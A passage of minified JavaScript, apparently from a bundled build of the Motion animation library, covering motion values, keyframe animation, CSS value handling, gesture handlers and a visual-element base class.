0&&e.autoplay!==!1&&(this.startTime=e.startTime),this.options=e}updateMotionValue(e){let{motionValue:t,onUpdate:n,onComplete:r,element:i,...a}=this.options;if(!t)return;if(e!==void 0){t.set(e);return}let o=new Oa({...a,autoplay:!1}),s=Math.max(vo,Wr.now()-this.startTime),c=Qn(0,vo,s-vo),l=o.sample(s).value,{name:u}=this.options;i&&u&&io(i,u,l),t.setWithVelocity(o.sample(Math.max(0,s-c)).value,l,c),o.stop()}},bo=(e,t)=>t===`zIndex`?!1:!!(typeof e==`number`||Array.isArray(e)||typeof e==`string`&&(Fi.test(e)||e===`0`)&&!e.startsWith(`url(`));function xo(e){let t=e[0];if(e.length===1)return!0;for(let n=0;n<e.length;n++)if(e[n]!==t)return!0}function So(e,t,n,r){let i=e[0];if(i===null)return!1;if(t===`display`||t===`visibility`)return!0;let a=e[e.length-1],o=bo(i,t),s=bo(a,t);return`${t}${i}${a}${o?a:i}`,!o||!s?!1:xo(e)||(n===`spring`||mo(n))&&r}function Co(e){e.duration=0,e.type=`keyframes`}var wo=new Set([`opacity`,`clipPath`,`filter`,`transform`]),To=rr(()=>Object.hasOwnProperty.call(Element.prototype,`animate`));function Eo(e){let{motionValue:t,name:n,repeatDelay:r,repeatType:i,damping:a,type:o}=e;if(!(t?.owner?.current instanceof HTMLElement))return!1;let{onUpdate:s,transformTemplate:c}=t.owner.getProps();return To()&&n&&wo.has(n)&&(n!==`transform`||!c)&&!s&&!r&&i!==`mirror`&&a!==0&&o!==`inertia`}var Do=40,Oo=class extends Ea{constructor({autoplay:e=!0,delay:t=0,type:n=`keyframes`,repeat:r=0,repeatDelay:i=0,repeatType:a=`loop`,keyframes:o,name:s,motionValue:c,element:l,...u}){super(),this.stop=()=>{this._animation&&(this._animation.stop(),this.stopTimeline?.()),this.keyframeResolver?.cancel()},this.createdAt=Wr.now();let d={autoplay:e,delay:t,type:n,repeat:r,repeatDelay:i,repeatType:a,name:s,motionValue:c,element:l,...u};this.keyframeResolver=new(l?.KeyframeResolver||no)(o,(e,t,n)=>this.onKeyframesResolved(e,t,d,!n),s,c,l),this.keyframeResolver?.scheduleResolve()}onKeyframesResolved(e,t,n,r){this.keyframeResolver=void 0;let{name:i,type:a,velocity:o,delay:s,isHandoff:c,onUpdate:l}=n;this.resolvedAt=Wr.now();let u=!0;So(e,i,a,o)||(u=!1,($n.instantAnimations||!s)&&l?.(Ca(e,n,t)),e[0]=e[e.length-1],Co(n),n.repeat=0);let d={startTime:r?this.resolvedAt&&this.resolvedAt-this.createdAt>Do?this.resolvedAt:this.createdAt:void 0,finalKeyframe:t,...n,keyframes:e},f=u&&!c&&Eo(d),p=d.motionValue?.owner?.current,m=f?new yo({...d,element:p}):new Oa(d);m.finished.then(()=>{this.notifyFinished()}).catch(ir),this.pendingTimeline&&=(this.stopTimeline=m.attachTimeline(this.pendingTimeline),void 0),this._animation=m}get finished(){return this._animation?this.animation.finished:this._finished}then(e,t){return this.finished.finally(e).then(()=>{})}get animation(){return this._animation||(this.keyframeResolver?.resume(),to()),this._animation}get duration(){return this.animation.duration}get iterationDuration(){return this.animation.iterationDuration}get time(){return this.animation.time}set time(e){this.animation.time=e}get speed(){return this.animation.speed}get state(){return this.animation.state}set speed(e){this.animation.speed=e}get startTime(){return this.animation.startTime}attachTimeline(e){return this._animation?this.stopTimeline=this.animation.attachTimeline(e):this.pendingTimeline=e,()=>this.stop()}play(){this.animation.play()}pause(){this.animation.pause()}complete(){this.animation.complete()}cancel(){this._animation&&this.animation.cancel(),this.keyframeResolver?.cancel()}};function ko(e,t,n,r=0,i=1){let a=Array.from(e).sort((e,t)=>e.sortNodePosition(t)).indexOf(t),o=e.size,s=(o-1)*r;return typeof n==`function`?n(a,o):i===1?a*r:s-a*r}var Ao=/^var\(--(?:([\w-]+)|([\w-]+), ?([a-zA-Z\d ()%#.,-]+))\)/u;function jo(e){let t=Ao.exec(e);if(!t)return[,];let[,n,r,i]=t;return[`--${n??r}`,i]}function Mo(e,t,n=1){`${e}`;let[r,i]=jo(e);if(!r)return;let a=window.getComputedStyle(t).getPropertyValue(r);if(a){let e=a.trim();return er(e)?parseFloat(e):e}return Yr(i)?Mo(i,t,n+1):i}var No={type:`spring`,stiffness:500,damping:25,restSpeed:10},Po=e=>({type:`spring`,stiffness:550,damping:e===0?2*Math.sqrt(550):30,restSpeed:10}),Fo={type:`keyframes`,duration:.8},Io={type:`keyframes`,ease:[.25,.1,.35,1],duration:.3},Lo=(e,{keyframes:t})=>t.length>2?Fo:Ua.has(e)?e.startsWith(`scale`)?Po(t[1]):No:Io,Ro=e=>e!==null;function zo(e,{repeat:t,repeatType:n=`loop`},r){let i=e.filter(Ro),a=t&&n!==`loop`&&t%2==1?0:i.length-1;return!a||r===void 0?i[a]:r}function Bo(e,t){if(e?.inherit&&t){let{inherit:n,...r}=e;return{...t,...r}}return e}function Vo(e,t){let n=e?.[t]??e?.default??e;return n===e?n:Bo(n,e)}function Ho({when:e,delay:t,delayChildren:n,staggerChildren:r,staggerDirection:i,repeat:a,repeatType:o,repeatDelay:s,from:c,elapsed:l,...u}){return!!Object.keys(u).length}var Uo=(e,t,n,r={},i,a)=>o=>{let s=Vo(r,e)||{},c=s.delay||r.delay||0,{elapsed:l=0}=r;l-=lr(c);let u={keyframes:Array.isArray(n)?n:[null,n],ease:`easeOut`,velocity:t.getVelocity(),...s,delay:-l,onUpdate:e=>{t.set(e),s.onUpdate&&s.onUpdate(e)},onComplete:()=>{o(),s.onComplete&&s.onComplete()},name:e,motionValue:t,element:a?void 0:i};Ho(s)||Object.assign(u,Lo(e,u)),u.duration&&=lr(u.duration),u.repeatDelay&&=lr(u.repeatDelay),u.from!==void 0&&(u.keyframes[0]=u.from);let d=!1;if((u.type===!1||u.duration===0&&!u.repeatDelay)&&(Co(u),u.delay===0&&(d=!0)),($n.instantAnimations||$n.skipAnimations||i?.shouldSkipAnimations)&&(d=!0,Co(u),u.delay=0),u.allowFlatten=!s.type&&!s.ease,d&&!a&&t.get()!==void 0){let e=zo(u.keyframes,s);if(e!==void 0){j.update(()=>{u.onUpdate(e),u.onComplete()});return}}return s.isSync?new Oa(u):new Oo(u)};function Wo(e){let t=[{},{}];return e?.values.forEach((e,n)=>{t[0][n]=e.get(),t[1][n]=e.getVelocity()}),t}function Go(e,t,n,r){if(typeof t==`function`){let[i,a]=Wo(r);t=t(n===void 0?e.custom:n,i,a)}if(typeof t==`string`&&(t=e.variants&&e.variants[t]),typeof t==`function`){let[i,a]=Wo(r);t=t(n===void 0?e.custom:n,i,a)}return t}function Ko(e,t,n){let r=e.getProps();return Go(r,t,n===void 0?r.custom:n,e)}var qo=new Set([`width`,`height`,`top`,`left`,`right`,`bottom`,...Ha]),Jo=30,Yo=e=>!isNaN(parseFloat(e)),Xo={current:void 0},Zo=class{constructor(e,t={}){this.canTrackVelocity=null,this.events={},this.updateAndNotify=e=>{let t=Wr.now();if(this.updatedAt!==t&&this.setPrevFrameValue(),this.prev=this.current,this.setCurrent(e),this.current!==this.prev&&(this.events.change?.notify(this.current),this.dependents))for(let e of this.dependents)e.dirty()},this.hasAnimated=!1,this.setCurrent(e),this.owner=t.owner}setCurrent(e){this.current=e,this.updatedAt=Wr.now(),this.canTrackVelocity===null&&e!==void 0&&(this.canTrackVelocity=Yo(this.current))}setPrevFrameValue(e=this.current){this.prevFrameValue=e,this.prevUpdatedAt=this.updatedAt}onChange(e){return this.on(`change`,e)}on(e,t){this.events[e]||(this.events[e]=new cr);let n=this.events[e].add(t);return e===`change`?()=>{n(),j.read(()=>{this.events.change.getSize()||this.stop()})}:n}clearListeners(){for(let e in this.events)this.events[e].clear()}attach(e,t){this.passiveEffect=e,this.stopPassiveEffect=t}set(e){this.passiveEffect?this.passiveEffect(e,this.updateAndNotify):this.updateAndNotify(e)}setWithVelocity(e,t,n){this.set(t),this.prev=void 0,this.prevFrameValue=e,this.prevUpdatedAt=this.updatedAt-n}jump(e,t=!0){this.updateAndNotify(e),this.prev=e,this.prevUpdatedAt=this.prevFrameValue=void 0,t&&this.stop(),this.stopPassiveEffect&&this.stopPassiveEffect()}dirty(){this.events.change?.notify(this.current)}addDependent(e){this.dependents||=new Set,this.dependents.add(e)}removeDependent(e){this.dependents&&this.dependents.delete(e)}get(){return Xo.current&&Xo.current.push(this),this.current}getPrevious(){return this.prev}getVelocity(){let e=Wr.now();if(!this.canTrackVelocity||this.prevFrameValue===void 0||e-this.updatedAt>Jo)return 0;let t=Math.min(this.updatedAt-this.prevUpdatedAt,Jo);return dr(parseFloat(this.current)-parseFloat(this.prevFrameValue),t)}start(e){return this.stop(),new Promise(t=>{this.hasAnimated=!0,this.animation=e(t),this.events.animationStart&&this.events.animationStart.notify()}).then(()=>{this.events.animationComplete&&this.events.animationComplete.notify(),this.clearAnimation()})}stop(){this.animation&&(this.animation.stop(),this.events.animationCancel&&this.events.animationCancel.notify()),this.clearAnimation()}isAnimating(){return!!this.animation}clearAnimation(){delete this.animation}destroy(){this.dependents?.clear(),this.events.destroy?.notify(),this.clearListeners(),this.stop(),this.stopPassiveEffect&&this.stopPassiveEffect()}};function Qo(e,t){return new Zo(e,t)}var $o=e=>Array.isArray(e);function es(e,t,n){e.hasValue(t)?e.getValue(t).set(n):e.addValue(t,Qo(n))}function ts(e){return $o(e)?e[e.length-1]||0:e}function ns(e,t){let{transitionEnd:n={},transition:r={},...i}=Ko(e,t)||{};i={...i,...n};for(let t in i)es(e,t,ts(i[t]))}var rs=e=>!!(e&&e.getVelocity);function is(e){return!!(rs(e)&&e.add)}function as(e,t){let n=e.getValue(`willChange`);if(is(n))return n.add(t);if(!n&&$n.WillChange){let n=new $n.WillChange(`auto`);e.addValue(`willChange`,n),n.add(t)}}function os(e){return e.replace(/([A-Z])/g,e=>`-${e.toLowerCase()}`)}var ss=`data-`+os(`framerAppearId`);function cs(e){return e.props[ss]}function ls({protectedKeys:e,needsAnimating:t},n){let r=e.hasOwnProperty(n)&&t[n]!==!0;return t[n]=!1,r}function us(e,t,{delay:n=0,transitionOverride:r,type:i}={}){let{transition:a,transitionEnd:o,...s}=t,c=e.getDefaultTransition();a=a?Bo(a,c):c;let l=a?.reduceMotion;r&&(a=r);let u=[],d=i&&e.animationState&&e.animationState.getState()[i];for(let t in s){let r=e.getValue(t,e.latestValues[t]??null),i=s[t];if(i===void 0||d&&ls(d,t))continue;let o={delay:n,...Vo(a||{},t)},c=r.get();if(c!==void 0&&!r.isAnimating&&!Array.isArray(i)&&i===c&&!o.velocity)continue;let f=!1;if(window.MotionHandoffAnimation){let n=cs(e);if(n){let e=window.MotionHandoffAnimation(n,t,j);e!==null&&(o.startTime=e,f=!0)}}as(e,t);let p=l??e.shouldReduceMotion;r.start(Uo(t,r,i,p&&qo.has(t)?{type:!1}:o,e,f));let m=r.animation;m&&u.push(m)}if(o){let t=()=>j.update(()=>{o&&ns(e,o)});u.length?Promise.all(u).then(t):t()}return u}function ds(e,t,n={}){let r=Ko(e,t,n.type===`exit`?e.presenceContext?.custom:void 0),{transition:i=e.getDefaultTransition()||{}}=r||{};n.transitionOverride&&(i=n.transitionOverride);let a=r?()=>Promise.all(us(e,r,n)):()=>Promise.resolve(),o=e.variantChildren&&e.variantChildren.size?(r=0)=>{let{delayChildren:a=0,staggerChildren:o,staggerDirection:s}=i;return fs(e,t,r,a,o,s,n)}:()=>Promise.resolve(),{when:s}=i;if(s){let[e,t]=s===`beforeChildren`?[a,o]:[o,a];return e().then(()=>t())}else return Promise.all([a(),o(n.delay)])}function fs(e,t,n=0,r=0,i=0,a=1,o){let s=[];for(let c of e.variantChildren)c.notify(`AnimationStart`,t),s.push(ds(c,t,{...o,delay:n+(typeof r==`function`?0:r)+ko(e.variantChildren,c,r,i,a)}).then(()=>c.notify(`AnimationComplete`,t)));return Promise.all(s)}function ps(e,t,n={}){e.notify(`AnimationStart`,t);let r;if(Array.isArray(t)){let i=t.map(t=>ds(e,t,n));r=Promise.all(i)}else if(typeof t==`string`)r=ds(e,t,n);else{let i=typeof t==`function`?Ko(e,t,n.custom):t;r=Promise.all(us(e,i,n))}return r.then(()=>{e.notify(`AnimationComplete`,t)})}var ms={test:e=>e===`auto`,parse:e=>e},hs=e=>t=>t.test(e),gs=[Qr,M,mi,pi,gi,hi,ms],_s=e=>gs.find(hs(e));function vs(e){return typeof e==`number`?e===0:e===null?!0:e===`none`||e===`0`||nr(e)}var ys=new Set([`brightness`,`contrast`,`saturate`,`opacity`]);function bs(e){let[t,n]=e.slice(0,-1).split(`(`);if(t===`drop-shadow`)return e;let[r]=n.match(ni)||[];if(!r)return e;let i=n.replace(r,``),a=ys.has(t)?1:0;return r!==n&&(a*=100),t+`(`+a+i+`)`}var xs=/\b([a-z-]*)\(.*?\)/gu,Ss={...Fi,getAnimatableNone:e=>{let t=e.match(xs);return t?t.map(bs).join(` `):e}},Cs={...Fi,getAnimatableNone:e=>{let t=Fi.parse(e);return Fi.createTransformer(e)(t.map(e=>typeof e==`number`?0:typeof e==`object`?{...e,alpha:1}:e))}},ws={...Qr,transform:Math.round},Ts={borderWidth:M,borderTopWidth:M,borderRightWidth:M,borderBottomWidth:M,borderLeftWidth:M,borderRadius:M,borderTopLeftRadius:M,borderTopRightRadius:M,borderBottomRightRadius:M,borderBottomLeftRadius:M,width:M,maxWidth:M,height:M,maxHeight:M,top:M,right:M,bottom:M,left:M,inset:M,insetBlock:M,insetBlockStart:M,insetBlockEnd:M,insetInline:M,insetInlineStart:M,insetInlineEnd:M,padding:M,paddingTop:M,paddingRight:M,paddingBottom:M,paddingLeft:M,paddingBlock:M,paddingBlockStart:M,paddingBlockEnd:M,paddingInline:M,paddingInlineStart:M,paddingInlineEnd:M,margin:M,marginTop:M,marginRight:M,marginBottom:M,marginLeft:M,marginBlock:M,marginBlockStart:M,marginBlockEnd:M,marginInline:M,marginInlineStart:M,marginInlineEnd:M,fontSize:M,backgroundPositionX:M,backgroundPositionY:M,rotate:pi,rotateX:pi,rotateY:pi,rotateZ:pi,scale:ei,scaleX:ei,scaleY:ei,scaleZ:ei,skew:pi,skewX:pi,skewY:pi,distance:M,translateX:M,translateY:M,translateZ:M,x:M,y:M,z:M,perspective:M,transformPerspective:M,opacity:$r,originX:_i,originY:_i,originZ:M,zIndex:ws,fillOpacity:$r,strokeOpacity:$r,numOctaves:ws},Es={...Ts,color:yi,backgroundColor:yi,outlineColor:yi,fill:yi,stroke:yi,borderColor:yi,borderTopColor:yi,borderRightColor:yi,borderBottomColor:yi,borderLeftColor:yi,filter:Ss,WebkitFilter:Ss,mask:Cs,WebkitMask:Cs},Ds=e=>Es[e],Os=new Set([Ss,Cs]);function ks(e,t){let n=Ds(e);return Os.has(n)||(n=Fi),n.getAnimatableNone?n.getAnimatableNone(t):void 0}var As=new Set([`auto`,`none`,`0`]);function js(e,t,n){let r=0,i;for(;r<e.length&&!i;){let t=e[r];typeof t==`string`&&!As.has(t)&&Oi(t).values.length&&(i=e[r]),r++}if(i&&n)for(let r of t)e[r]=ks(n,i)}var Ms=class extends no{constructor(e,t,n,r,i){super(e,t,n,r,i,!0)}readKeyframes(){let{unresolvedKeyframes:e,element:t,name:n}=this;if(!t||!t.current)return;super.readKeyframes();for(let n=0;n<e.length;n++){let r=e[n];if(typeof r==`string`&&(r=r.trim(),Yr(r))){let i=Mo(r,t.current);i!==void 0&&(e[n]=i),n===e.length-1&&(this.finalKeyframe=r)}}if(this.resolveNoneKeyframes(),!qo.has(n)||e.length!==2)return;let[r,i]=e,a=_s(r),o=_s(i);if(Zr(r)!==Zr(i)&&Ja[n]){this.needsMeasurement=!0;return}if(a!==o)if(Wa(a)&&Wa(o))for(let t=0;t<e.length;t++){let n=e[t];typeof n==`string`&&(e[t]=parseFloat(n))}else Ja[n]&&(this.needsMeasurement=!0)}resolveNoneKeyframes(){let{unresolvedKeyframes:e,name:t}=this,n=[];for(let t=0;t<e.length;t++)(e[t]===null||vs(e[t]))&&n.push(t);n.length&&js(e,n,t)}measureInitialState(){let{element:e,unresolvedKeyframes:t,name:n}=this;if(!e||!e.current)return;n===`height`&&(this.suspendedScrollY=window.pageYOffset),this.measuredOrigin=Ja[n](e.measureViewportBox(),window.getComputedStyle(e.current)),t[0]=this.measuredOrigin;let r=t[t.length-1];r!==void 0&&e.getValue(n,r).jump(r,!1)}measureEndState(){let{element:e,name:t,unresolvedKeyframes:n}=this;if(!e||!e.current)return;let r=e.getValue(t);r&&r.jump(this.measuredOrigin,!1);let i=n.length-1,a=n[i];n[i]=Ja[t](e.measureViewportBox(),window.getComputedStyle(e.current)),a!==null&&this.finalKeyframe===void 0&&(this.finalKeyframe=a),this.removedTransforms?.length&&this.removedTransforms.forEach(([t,n])=>{e.getValue(t).set(n)}),this.resolveNoneKeyframes()}},Ns=new Set([`opacity`,`clipPath`,`filter`,`transform`]);function Ps(e,t,n){if(e==null)return[];if(e instanceof EventTarget)return[e];if(typeof e==`string`){let r=document;t&&(r=t.current);let i=n?.[e]??r.querySelectorAll(e);return i?Array.from(i):[]}return Array.from(e).filter(e=>e!=null)}var Fs=(e,t)=>t&&typeof e==`number`?t.transform(e):e;function Is(e){return tr(e)&&`offsetHeight`in e&&!(`ownerSVGElement`in e)}var{schedule:Ls,cancel:Rs}=Rr(queueMicrotask,!1),zs={x:!1,y:!1};function Bs(){return zs.x||zs.y}function Vs(e){return e===`x`||e===`y`?zs[e]?null:(zs[e]=!0,()=>{zs[e]=!1}):zs.x||zs.y?null:(zs.x=zs.y=!0,()=>{zs.x=zs.y=!1})}function Hs(e,t){let n=Ps(e),r=new AbortController;return[n,{passive:!0,...t,signal:r.signal},()=>r.abort()]}function Us(e){return!(e.pointerType===`touch`||Bs())}function Ws(e,t,n={}){let[r,i,a]=Hs(e,n);return r.forEach(e=>{let n=!1,r=!1,a,o=()=>{e.removeEventListener(`pointerleave`,u)},s=e=>{a&&=(a(e),void 0),o()},c=e=>{n=!1,window.removeEventListener(`pointerup`,c),window.removeEventListener(`pointercancel`,c),r&&(r=!1,s(e))},l=()=>{n=!0,window.addEventListener(`pointerup`,c,i),window.addEventListener(`pointercancel`,c,i)},u=e=>{if(e.pointerType!==`touch`){if(n){r=!0;return}s(e)}};e.addEventListener(`pointerenter`,n=>{if(!Us(n))return;r=!1;let o=t(e,n);typeof o==`function`&&(a=o,e.addEventListener(`pointerleave`,u,i))},i),e.addEventListener(`pointerdown`,l,i)}),a}var Gs=(e,t)=>t?e===t?!0:Gs(e,t.parentElement):!1,Ks=e=>e.pointerType===`mouse`?typeof e.button!=`number`||e.button<=0:e.isPrimary!==!1,qs=new Set([`BUTTON`,`INPUT`,`SELECT`,`TEXTAREA`,`A`]);function Js(e){return qs.has(e.tagName)||e.isContentEditable===!0}var Ys=new Set([`INPUT`,`SELECT`,`TEXTAREA`]);function Xs(e){return Ys.has(e.tagName)||e.isContentEditable===!0}var Zs=new WeakSet;function Qs(e){return t=>{t.key===`Enter`&&e(t)}}function $s(e,t){e.dispatchEvent(new PointerEvent(`pointer`+t,{isPrimary:!0,bubbles:!0}))}var ec=(e,t)=>{let n=e.currentTarget;if(!n)return;let r=Qs(()=>{if(Zs.has(n))return;$s(n,`down`);let e=Qs(()=>{$s(n,`up`)});n.addEventListener(`keyup`,e,t),n.addEventListener(`blur`,()=>$s(n,`cancel`),t)});n.addEventListener(`keydown`,r,t),n.addEventListener(`blur`,()=>n.removeEventListener(`keydown`,r),t)};function tc(e){return Ks(e)&&!Bs()}var nc=new WeakSet;function rc(e,t,n={}){let[r,i,a]=Hs(e,n),o=e=>{let r=e.currentTarget;if(!tc(e)||nc.has(e))return;Zs.add(r),n.stopPropagation&&nc.add(e);let a=t(r,e),o=(e,t)=>{window.removeEventListener(`pointerup`,s),window.removeEventListener(`pointercancel`,c),Zs.has(r)&&Zs.delete(r),tc(e)&&typeof a==`function`&&a(e,{success:t})},s=e=>{o(e,r===window||r===document||n.useGlobalTarget||Gs(r,e.target))},c=e=>{o(e,!1)};window.addEventListener(`pointerup`,s,i),window.addEventListener(`pointercancel`,c,i)};return r.forEach(e=>{(n.useGlobalTarget?window:e).addEventListener(`pointerdown`,o,i),Is(e)&&(e.addEventListener(`focus`,e=>ec(e,i)),!Js(e)&&!e.hasAttribute(`tabindex`)&&(e.tabIndex=0))}),a}function ic(e){return tr(e)&&`ownerSVGElement`in e}var ac=new WeakMap,oc,sc=(e,t,n)=>(r,i)=>i&&i[0]?i[0][e+`Size`]:ic(r)&&`getBBox`in r?r.getBBox()[t]:r[n],cc=sc(`inline`,`width`,`offsetWidth`),lc=sc(`block`,`height`,`offsetHeight`);function uc({target:e,borderBoxSize:t}){ac.get(e)?.forEach(n=>{n(e,{get width(){return cc(e,t)},get height(){return lc(e,t)}})})}function dc(e){e.forEach(uc)}function fc(){typeof ResizeObserver>`u`||(oc=new ResizeObserver(dc))}function pc(e,t){oc||fc();let n=Ps(e);return n.forEach(e=>{let n=ac.get(e);n||(n=new Set,ac.set(e,n)),n.add(t),oc?.observe(e)}),()=>{n.forEach(e=>{let n=ac.get(e);n?.delete(t),n?.size||oc?.unobserve(e)})}}var mc=new Set,hc;function gc(){hc=()=>{let e={get width(){return window.innerWidth},get height(){return window.innerHeight}};mc.forEach(t=>t(e))},window.addEventListener(`resize`,hc)}function _c(e){return mc.add(e),hc||gc(),()=>{mc.delete(e),!mc.size&&typeof hc==`function`&&(window.removeEventListener(`resize`,hc),hc=void 0)}}function vc(e,t){return typeof e==`function`?_c(e):pc(e,t)}function yc(e){return ic(e)&&e.tagName===`svg`}var bc=[...gs,yi,Fi],xc=e=>bc.find(hs(e)),Sc=()=>({translate:0,scale:1,origin:0,originPoint:0}),Cc=()=>({x:Sc(),y:Sc()}),wc=()=>({min:0,max:0}),Tc=()=>({x:wc(),y:wc()}),Ec=new WeakMap;function Dc(e){return typeof e==`object`&&!!e&&typeof e.start==`function`}function Oc(e){return typeof e==`string`||Array.isArray(e)}var kc=[`animate`,`whileInView`,`whileFocus`,`whileHover`,`whileTap`,`whileDrag`,`exit`],Ac=[`initial`,...kc];function jc(e){return Dc(e.animate)||Ac.some(t=>Oc(e[t]))}function Mc(e){return!!(jc(e)||e.variants)}function Nc(e,t,n){for(let r in t){let i=t[r],a=n[r];if(rs(i))e.addValue(r,i);else if(rs(a))e.addValue(r,Qo(i,{owner:e}));else if(a!==i)if(e.hasValue(r)){let t=e.getValue(r);t.liveStyle===!0?t.jump(i):t.hasAnimated||t.set(i)}else{let t=e.getStaticValue(r);e.addValue(r,Qo(t===void 0?i:t,{owner:e}))}}for(let r in n)t[r]===void 0&&e.removeValue(r);return t}var Pc={current:null},Fc={current:!1},Ic=typeof window<`u`;function Lc(){if(Fc.current=!0,Ic)if(window.matchMedia){let e=window.matchMedia(`(prefers-reduced-motion)`),t=()=>Pc.current=e.matches;e.addEventListener(`change`,t),t()}else Pc.current=!1}var Rc=[`AnimationStart`,`AnimationComplete`,`Update`,`BeforeLayoutMeasure`,`LayoutMeasure`,`LayoutAnimationStart`,`LayoutAnimationComplete`],zc={};function Bc(e){zc=e}function Vc(){return zc}var Hc=class{scrapeMotionValuesFromProps(e,t,n){return{}}constructor({parent:e,props:t,presenceContext:n,reducedMotionConfig:r,skipAnimations:i,blockInitialAnimation:a,visualState:o},s={}){this.current=null,this.children=new Set,this.isVariantNode=!1,this.isControllingVariants=!1,this.shouldReduceMotion=null,this.shouldSkipAnimations=!1,this.values=new Map,this.KeyframeResolver=no,this.features={},this.valueSubscriptions=new Map,this.prevMotionValues={},this.hasBeenMounted=!1,this.events={},this.propEventSubscriptions={},this.notifyUpdate=()=>this.notify(`Update`,this.latestValues),this.render=()=>{this.current&&(this.triggerBuild(),this.renderInstance(this.current,this.renderState,this.props.style,this.projection))},this.renderScheduledAt=0,this.scheduleRender=()=>{let e=Wr.now();this.renderScheduledAt<e&&(this.renderScheduledAt=e,j.render(this.render,!1,!0))};let{latestValues:c,renderState:l}=o;this.latestValues=c,this.baseTarget={...c},this.initialValues=t.initial?{...c}:{},this.renderState=l,this.parent=e,this.props=t,this.presenceContext=n,this.depth=e?e.depth+1:0,this.reducedMotionConfig=r,this.skipAnimationsConfig=i,this.options=s,this.blockInitialAnimation=!!a,this.isControllingVariants=jc(t),this.isVariantNode=Mc(t),this.isVariantNode&&(this.variantChildren=new Set),this.manuallyAnimateOnMount=!!(e&&e.current);let{willChange:u,...d}=this.scrapeMotionValuesFromProps(t,{},this);for(let e in d){let t=d[e];c[e]!==void 0&&rs(t)&&t.set(c[e])}}mount(e){if(this.hasBeenMounted)for(let e in this.initialValues)this.values.get(e)?.jump(this.initialValues[e]),this.latestValues[e]=this.initialValues[e];this.current=e,Ec.set(e,this),this.projection&&!this.projection.instance&&this.projection.mount(e),this.parent&&this.isVariantNode&&!this.isControllingVariants&&(this.removeFromVariantTree=this.parent.addVariantChild(this)),this.values.forEach((e,t)=>this.bindToMotionValue(t,e)),this.reducedMotionConfig===`never`?this.shouldReduceMotion=!1:this.reducedMotionConfig===`always`?this.shouldReduceMotion=!0:(Fc.current||Lc(),this.shouldReduceMotion=Pc.current),this.shouldSkipAnimations=this.skipAnimationsConfig??!1,this.parent?.addChild(this),this.update(this.props,this.presenceContext),this.hasBeenMounted=!0}unmount(){this.projection&&this.projection.unmount(),zr(this.notifyUpdate),zr(this.render),this.valueSubscriptions.forEach(e=>e()),this.valueSubscriptions.clear(),this.removeFromVariantTree&&this.removeFromVariantTree(),this.parent?.removeChild(this);for(let e in this.events)this.events[e].clear();for(let e in this.features){let t=this.features[e];t&&(t.unmount(),t.isMounted=!1)}this.current=null}addChild(e){this.children.add(e),this.enteringChildren??=new Set,this.enteringChildren.add(e)}removeChild(e){this.children.delete(e),this.enteringChildren&&this.enteringChildren.delete(e)}bindToMotionValue(e,t){if(this.valueSubscriptions.has(e)&&this.valueSubscriptions.get(e)(),t.accelerate&&Ns.has(e)&&this.current instanceof HTMLElement){let{factory:n,keyframes:r,times:i,ease:a,duration:o}=t.accelerate,s=new go({element:this.current,name:e,keyframes:r,times:i,ease:a,duration:lr(o)}),c=n(s);this.valueSubscriptions.set(e,()=>{c(),s.cancel()});return}let n=Ua.has(e);n&&this.onBindTransform&&this.onBindTransform();let r=t.on(`change`,t=>{this.latestValues[e]=t,this.props.onUpdate&&j.preRender(this.notifyUpdate),n&&this.projection&&(this.projection.isTransformDirty=!0),this.scheduleRender()}),i;typeof window<`u`&&window.MotionCheckAppearSync&&(i=window.MotionCheckAppearSync(this,e,t)),this.valueSubscriptions.set(e,()=>{r(),i&&i(),t.owner&&t.stop()})}sortNodePosition(e){return!this.current||!this.sortInstanceNodePosition||this.type!==e.type?0:this.sortInstanceNodePosition(this.current,e.current)}updateFeatures(){let e=`animation`;for(e in zc){let t=zc[e];if(!t)continue;let{isEnabled:n,Feature:r}=t;if(!this.features[e]&&r&&n(this.props)&&(this.features[e]=new r(this)),this.features[e]){let t=this.features[e];t.isMounted?t.update():(t.mount(),t.isMounted=!0)}}}triggerBuild(){this.build(this.renderState,this.latestValues,this.props)}measureViewportBox(){return this.current?this.measureInstanceViewportBox(this.current,this.props):Tc()}getStaticValue(e){return this.latestValues[e]}setStaticValue(e,t){this.latestValues[e]=t}update(e,t){(e.transformTemplate||this.props.transformTemplate)&&this.scheduleRender(),this.prevProps=this.props,this.props=e,this.prevPresenceContext=this.presenceContext,this.presenceContext=t;for(let t=0;t<Rc.length;t++){let n=Rc[t];this.propEventSubscriptions[n]&&(this.propEventSubscriptions[n](),delete this.propEventSubscriptions[n]);let r=e[`on`+n];r&&(this.propEventSubscriptions[n]=this.on(n,r))}this.prevMotionValues=Nc(this,this.scrapeMotionValuesFromProps(e,this.prevProps||{},this),this.prevMotionValues),this.handleChildMotionValue&&this.handleChildMotionValue()}getProps(){return this.props}getVariant(e){return this.props.variants?this.props.variants[e]:void 0}getDefaultTransition(){return this.props.transition}getTransformPagePoint(){return this.props.transformPagePoint}getClosestVariantNode(){return this.isVariantNode?this:this.parent?this.parent.getClosestVariantNode():void 0}addVariantChild(e){let t=this.getClosestVariantNode();if(t)return t.variantChildren&&t.variantChildren.add(e),()=>t.variantChildren.delete(e)}addValue(e,t){let n=this.values.get(e);t!==n&&(n&&this.removeValue(e),this.bindToMotionValue(e,t),this.values.set(e,t),this.latestValues[e]=t.get())}removeValue(e){this.values.delete(e);let t=this.valueSubscriptions.get(e);t&&(t(),this.valueSubscriptions.delete(e)),delete this.latestValues[e],this.removeValueFromRenderState(e,this.renderState)}hasValue(e){return this.values.has(e)}getValue(e,t){if(this.props.values&&this.props.values[e])return this.props.values[e];let n=this.values.get(e);return n===void 0&&t!==void 0&&(n=Qo(t===null?void 0:t,{owner:this}),this.addValue(e,n)),n}readValue(e,t){let n=this.latestValues[e]!==void 0||!this.current?this.latestValues[e]:this.getBaseTargetFromProps(this.props,e)??this.readValueFromInstance(this.current,e,this.options);return n!=null&&(typeof n==`string`&&(er(n)||nr(n))?n=parseFloat(n):!xc(n)&&Fi.test(t)&&(n=ks(e,t)),this.setBaseTarget(e,rs(n)?n.get():n)),rs(n)?n.get():n}setBaseTarget(e,t){this.baseTarget[e]=t}getBaseTarget(e){let{initial:t}=this.props,n;if(typeof t==`string`||typeof t==`object`){let r=Go(this.props,t,this.presenceContext?.custom);r&&(n=r[e])}if(t&&n!==void 0)return n;let r=this.getBaseTargetFromProps(this.props,e);return r!==void 0&&!rs(r)?r:this.initialValues[e]!==void 0&&n===void 0?void 0:this.baseTarget[e]}on(e,t){return this.events[e]||(this.events[e]=new cr),this.events[e].add(t)}notify(e,...t){this.events[e]&&this.events[e].notify(...t)}scheduleRenderMicrotask(){Ls.render(this.render)}},Uc=class extends 